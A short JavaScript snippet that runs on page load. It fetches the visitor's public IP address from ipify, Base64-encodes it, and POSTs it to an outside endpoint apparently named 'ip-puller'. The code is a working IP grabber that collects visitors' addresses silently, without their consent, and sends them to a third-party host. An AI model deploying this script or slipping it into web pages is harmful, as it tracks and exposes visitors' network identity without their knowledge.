// This function fetches the user's IP address, encodes it, and sends a POST request.
async function getUserIP() {
    try {
        // Fetching the user's IP address using the ipify API
        const response = await fetch('https://api.ipify.org?format=json');
        if (!response.ok) {
            throw new Error('Failed to fetch IP address');
        }

        const data = await response.json();
        const ip = data.ip;
        console.log('Your IP Address is:', ip);

        // Encode the IP address to Base64
        const encodedIP = btoa(ip); // Base64 encode the IP

        // Send the encoded IP via POST request
        await sendEncodedIP(encodedIP);
    } catch (error) {
        console.error('Error fetching IP address:', error);
    }
}

// This function sends a POST request with the encoded IP address
async function sendEncodedIP(encodedIP) {
    try {
        const response = await fetch('https://ip-puller-part-2.vercel.app/api/api.js', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ ip: encodedIP })
        });

        if (!response.ok) {
            throw new Error('Failed to send POST request');
        }

        const result = await response.json();
        console.log('Response from API:', result);
    } catch (error) {
        console.error('Error sending POST request:', error);
    }
}

// Call the function to fetch and send the IP address when the page is loaded
window.onload = getUserIP;
